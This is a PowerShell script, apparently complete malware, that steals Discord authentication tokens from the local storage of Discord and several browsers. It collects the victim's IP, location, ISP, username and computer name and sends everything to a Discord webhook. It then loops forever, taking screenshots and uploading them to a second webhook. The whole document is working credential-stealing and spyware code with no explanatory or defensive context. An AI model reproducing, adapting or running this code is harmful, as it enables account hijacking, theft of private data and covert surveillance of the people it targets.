[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") 
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 

$uri = "discord webhook link to send all data except screenshots"
$ssuri = "discord webhook link to send screenshots"

function Send {
    param ($content)
    $content = @{ "content" = $content; }
    Invoke-WebRequest -uri $uri -Method POST -Body ($content | convertto-json) -Headers @{'Content-Type' = 'application/json'} -UseBasicParsing
}

function FindTokens {
    param ($Path)
    $tokens = ""
    Get-ChildItem $Path -Recurse -Include "*.ldb", "*.log" | Foreach-Object {
        $data = Get-Content $_.FullName
        foreach ($regex in [regex]'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', [regex]'mfa\.[\w-]{84}') {
            ($regex).Matches($data) | ForEach-Object {
                $tokens += $_.Value + "`n"
            }
            
        }
    }    
    return $tokens
}

function GetInfo {
    $resp = Invoke-WebRequest -UseBasicParsing -URI "http://ipinfo.io/json" | ConvertFrom-Json
    $vpn = Invoke-WebRequest -UseBasicParsing -URI 'http://ip-api.com/json?fields=proxy' | ConvertFrom-Json
    return "
**IP**: $($resp.ip)
**CITY**: $($resp.city)
**REGION**: $($resp.region)
**VPN**: $($vpn.proxy)
**Inaccurate Location**: https://www.google.com/maps/search/google+map++$($resp.loc)
**ISP**: $($resp.org)
**TIMEZONE**: $($resp.timezone)
**USERNAME**: $env:USERNAME 
**USERPROFILE**: $env:USERPROFILE
**COMPUTER NAME**: $env:COMPUTERNAME
    "
}

[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
function screenshot([Drawing.Rectangle]$bounds, $path) {
   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
   $graphics = [Drawing.Graphics]::FromImage($bmp)

   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

   $bmp.Save($path)

   $graphics.Dispose()
   $bmp.Dispose()
}

$local =  $env:LOCALAPPDATA
$roaming = $env:APPDATA
$paths = @(
    $roaming + '\Discord'
    $roaming + '\discordcanary'
    $roaming + '\discordptb'
    $local + '\Google\Chrome\User Data\Default'
    $roaming + '\Opera Software\Opera Stable'
    $local + '\BraveSoftware\Brave-Browser\User Data\Default'
)

$info = GetInfo
$message = $info + '```Tokens:' + "`n"

foreach ($path in $paths) {
    if (Test-Path -Path $path) {
        $tokens = FindTokens -Path ($path + "\Local Storage\leveldb")
        $message += $tokens + "`n"
    }
}
$message += '```'
Send -content $message

$wc = New-Object System.Net.WebClient

while (1) {
    $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Width, [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Height)
    screenshot $bounds "$env:LocalAppData\Temp\screenshot.jpg"
    $path = "$env:LocalAppData\Temp\screenshot.jpg"
    $resp = $wc.UploadFile($ssuri,$path)
}